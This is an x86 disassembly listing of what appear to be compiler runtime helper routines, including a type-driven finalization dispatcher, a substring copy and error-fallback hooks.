  4042a0:	55                   	push   %ebp
  4042a1:	8b ec                	mov    %esp,%ebp
  4042a3:	53                   	push   %ebx
  4042a4:	56                   	push   %esi
  4042a5:	57                   	push   %edi
  4042a6:	8b f9                	mov    %ecx,%edi
  4042a8:	8b da                	mov    %edx,%ebx
  4042aa:	8b f0                	mov    %eax,%esi
  4042ac:	8b c6                	mov    %esi,%eax
  4042ae:	e8 5d ff ff ff       	call   0x404210
  4042b3:	83 fb 01             	cmp    $0x1,%ebx
  4042b6:	7d 04                	jge    0x4042bc
  4042b8:	33 db                	xor    %ebx,%ebx
  4042ba:	eb 07                	jmp    0x4042c3
  4042bc:	4b                   	dec    %ebx
  4042bd:	3b c3                	cmp    %ebx,%eax
  4042bf:	7d 02                	jge    0x4042c3
  4042c1:	8b d8                	mov    %eax,%ebx
  4042c3:	85 ff                	test   %edi,%edi
  4042c5:	7d 04                	jge    0x4042cb
  4042c7:	33 c0                	xor    %eax,%eax
  4042c9:	eb 08                	jmp    0x4042d3
  4042cb:	2b c3                	sub    %ebx,%eax
  4042cd:	3b f8                	cmp    %eax,%edi
  4042cf:	7d 02                	jge    0x4042d3
  4042d1:	8b c7                	mov    %edi,%eax
  4042d3:	8b d3                	mov    %ebx,%edx
  4042d5:	03 d2                	add    %edx,%edx
  4042d7:	03 d6                	add    %esi,%edx
  4042d9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042dc:	91                   	xchg   %eax,%ecx
  4042dd:	e8 ae fe ff ff       	call   0x404190
  4042e2:	5f                   	pop    %edi
  4042e3:	5e                   	pop    %esi
  4042e4:	5b                   	pop    %ebx
  4042e5:	5d                   	pop    %ebp
  4042e6:	c2 04 00             	ret    $0x4
  4042e9:	8d 40 00             	lea    0x0(%eax),%eax
  4042ec:	53                   	push   %ebx
  4042ed:	56                   	push   %esi
  4042ee:	57                   	push   %edi
  4042ef:	8b f2                	mov    %edx,%esi
  4042f1:	8b f8                	mov    %eax,%edi
  4042f3:	33 db                	xor    %ebx,%ebx
  4042f5:	85 f6                	test   %esi,%esi
  4042f7:	7e 27                	jle    0x404320
  4042f9:	8b c6                	mov    %esi,%eax
  4042fb:	e8 7c fd ff ff       	call   0x40407c
  404300:	8b d8                	mov    %eax,%ebx
  404302:	8b 07                	mov    (%edi),%eax
  404304:	e8 07 ff ff ff       	call   0x404210
  404309:	85 c0                	test   %eax,%eax
  40430b:	7e 13                	jle    0x404320
  40430d:	3b f0                	cmp    %eax,%esi
  40430f:	7d 02                	jge    0x404313
  404311:	8b c6                	mov    %esi,%eax
  404313:	8b c8                	mov    %eax,%ecx
  404315:	03 c9                	add    %ecx,%ecx
  404317:	8b d3                	mov    %ebx,%edx
  404319:	8b 07                	mov    (%edi),%eax
  40431b:	e8 90 e4 ff ff       	call   0x4027b0
  404320:	8b c7                	mov    %edi,%eax
  404322:	8b d3                	mov    %ebx,%edx
  404324:	e8 6b fd ff ff       	call   0x404094
  404329:	5f                   	pop    %edi
  40432a:	5e                   	pop    %esi
  40432b:	5b                   	pop    %ebx
  40432c:	c3                   	ret
  40432d:	8d 40 00             	lea    0x0(%eax),%eax
  404330:	31 c9                	xor    %ecx,%ecx
  404332:	53                   	push   %ebx
  404333:	8a 4a 01             	mov    0x1(%edx),%cl
  404336:	56                   	push   %esi
  404337:	57                   	push   %edi
  404338:	89 c3                	mov    %eax,%ebx
  40433a:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  40433e:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  404342:	8b 16                	mov    (%esi),%edx
  404344:	8b 46 04             	mov    0x4(%esi),%eax
  404347:	01 d8                	add    %ebx,%eax
  404349:	8b 12                	mov    (%edx),%edx
  40434b:	b9 01 00 00 00       	mov    $0x1,%ecx
  404350:	e8 27 00 00 00       	call   0x40437c
  404355:	83 c6 08             	add    $0x8,%esi
  404358:	4f                   	dec    %edi
  404359:	7f e7                	jg     0x404342
  40435b:	89 d8                	mov    %ebx,%eax
  40435d:	5f                   	pop    %edi
  40435e:	5e                   	pop    %esi
  40435f:	5b                   	pop    %ebx
  404360:	c3                   	ret
  404361:	8d 40 00             	lea    0x0(%eax),%eax
  404364:	83 3d 0c 40 41 00 00 	cmpl   $0x0,0x41400c
  40436b:	74 07                	je     0x404374
  40436d:	ff 15 0c 40 41 00    	call   *0x41400c
  404373:	c3                   	ret
  404374:	b0 10                	mov    $0x10,%al
  404376:	e8 95 e3 ff ff       	call   0x402710
  40437b:	c3                   	ret
  40437c:	83 f9 00             	cmp    $0x0,%ecx
  40437f:	0f 84 e0 00 00 00    	je     0x404465
  404385:	50                   	push   %eax
  404386:	53                   	push   %ebx
  404387:	56                   	push   %esi
  404388:	57                   	push   %edi
  404389:	89 c3                	mov    %eax,%ebx
  40438b:	89 d6                	mov    %edx,%esi
  40438d:	89 cf                	mov    %ecx,%edi
  40438f:	31 d2                	xor    %edx,%edx
  404391:	8a 06                	mov    (%esi),%al
  404393:	8a 56 01             	mov    0x1(%esi),%dl
  404396:	3c 0a                	cmp    $0xa,%al
  404398:	74 25                	je     0x4043bf
  40439a:	3c 0b                	cmp    $0xb,%al
  40439c:	74 3e                	je     0x4043dc
  40439e:	3c 0c                	cmp    $0xc,%al
  4043a0:	74 51                	je     0x4043f3
  4043a2:	3c 0d                	cmp    $0xd,%al
  4043a4:	74 5c                	je     0x404402
  4043a6:	3c 0e                	cmp    $0xe,%al
  4043a8:	74 76                	je     0x404420
  4043aa:	3c 0f                	cmp    $0xf,%al
  4043ac:	0f 84 84 00 00 00    	je     0x404436
  4043b2:	3c 11                	cmp    $0x11,%al
  4043b4:	0f 84 8b 00 00 00    	je     0x404445
  4043ba:	e9 97 00 00 00       	jmp    0x404456
  4043bf:	83 f9 01             	cmp    $0x1,%ecx
  4043c2:	89 d8                	mov    %ebx,%eax
  4043c4:	7f 0a                	jg     0x4043d0
  4043c6:	e8 79 f6 ff ff       	call   0x403a44
  4043cb:	e9 91 00 00 00       	jmp    0x404461
  4043d0:	89 ca                	mov    %ecx,%edx
  4043d2:	e8 91 f6 ff ff       	call   0x403a68
  4043d7:	e9 85 00 00 00       	jmp    0x404461
  4043dc:	83 f9 01             	cmp    $0x1,%ecx
  4043df:	89 d8                	mov    %ebx,%eax
  4043e1:	7f 07                	jg     0x4043ea
  4043e3:	e8 bc fc ff ff       	call   0x4040a4
  4043e8:	eb 77                	jmp    0x404461
  4043ea:	89 ca                	mov    %ecx,%edx
  4043ec:	e8 cb fc ff ff       	call   0x4040bc
  4043f1:	eb 6e                	jmp    0x404461
  4043f3:	89 d8                	mov    %ebx,%eax
  4043f5:	83 c3 10             	add    $0x10,%ebx
  4043f8:	e8 67 ff ff ff       	call   0x404364
  4043fd:	4f                   	dec    %edi
  4043fe:	7f f3                	jg     0x4043f3
  404400:	eb 5f                	jmp    0x404461
  404402:	55                   	push   %ebp
  404403:	89 d5                	mov    %edx,%ebp
  404405:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  404409:	89 d8                	mov    %ebx,%eax
  40440b:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  40440f:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  404413:	8b 12                	mov    (%edx),%edx
  404415:	e8 62 ff ff ff       	call   0x40437c
  40441a:	4f                   	dec    %edi
  40441b:	7f e8                	jg     0x404405
  40441d:	5d                   	pop    %ebp
  40441e:	eb 41                	jmp    0x404461
  404420:	55                   	push   %ebp
  404421:	89 d5                	mov    %edx,%ebp
  404423:	89 d8                	mov    %ebx,%eax
  404425:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  404429:	89 f2                	mov    %esi,%edx
  40442b:	e8 00 ff ff ff       	call   0x404330
  404430:	4f                   	dec    %edi
  404431:	7f f0                	jg     0x404423
  404433:	5d                   	pop    %ebp
  404434:	eb 2b                	jmp    0x404461
  404436:	89 d8                	mov    %ebx,%eax
  404438:	83 c3 04             	add    $0x4,%ebx
  40443b:	e8 f4 0a 00 00       	call   0x404f34
  404440:	4f                   	dec    %edi
  404441:	7f f3                	jg     0x404436
  404443:	eb 1c                	jmp    0x404461
  404445:	89 d8                	mov    %ebx,%eax
  404447:	89 f2                	mov    %esi,%edx
  404449:	83 c3 04             	add    $0x4,%ebx
  40444c:	e8 3f 04 00 00       	call   0x404890
  404451:	4f                   	dec    %edi
  404452:	7f f1                	jg     0x404445
  404454:	eb 0b                	jmp    0x404461
  404456:	5f                   	pop    %edi
  404457:	5e                   	pop    %esi
  404458:	5b                   	pop    %ebx
  404459:	58                   	pop    %eax
  40445a:	b0 02                	mov    $0x2,%al
  40445c:	e9 af e2 ff ff       	jmp    0x402710
  404461:	5f                   	pop    %edi
  404462:	5e                   	pop    %esi
  404463:	5b                   	pop    %ebx
  404464:	58                   	pop    %eax
  404465:	c3                   	ret
  404466:	8b c0                	mov    %eax,%eax
  404468:	b9 01 00 00 00       	mov    $0x1,%ecx
  40446d:	e9 0a ff ff ff       	jmp    0x40437c
  404472:	c3                   	ret
  404473:	90                   	nop
  404474:	83 3d 14 40 41 00 00 	cmpl   $0x0,0x414014
  40447b:	74 07                	je     0x404484
  40447d:	ff 15 14 40 41 00    	call   *0x414014
  404483:	c3                   	ret
  404484:	b0 10                	mov    $0x10,%al
  404486:	e8 85 e2 ff ff       	call   0x402710
  40448b:	c3                   	ret
  40448c:	53                   	push   %ebx
  40448d:	56                   	push   %esi
  40448e:	57                   	push   %edi
  40448f:	55                   	push   %ebp
  404490:	89 c3                	mov    %eax,%ebx
